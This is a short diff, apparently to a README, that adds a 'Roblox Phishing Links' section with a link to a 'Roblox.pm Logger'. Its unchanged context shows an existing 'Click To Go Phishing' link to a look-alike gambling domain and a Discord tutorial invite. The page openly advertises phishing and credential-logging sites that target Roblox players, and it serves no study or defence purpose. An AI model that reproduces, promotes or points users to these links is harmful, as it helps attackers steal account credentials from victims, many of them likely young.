@@ -18,5 +18,9 @@
 
 [Click To Go Phishing](https://rbxflip.eu/index.php/)
 
+## Roblox Phishing Links (OP, OFFICIAL, UP) 🟢
+[Click To Go Roblox.pm Logger](https://roblox.pm/creates/index/)
+
+
 ## Tutorial and Discord Server
 [Join Discord Server](https://discord.gg/Y4zkZNMv) 🟢
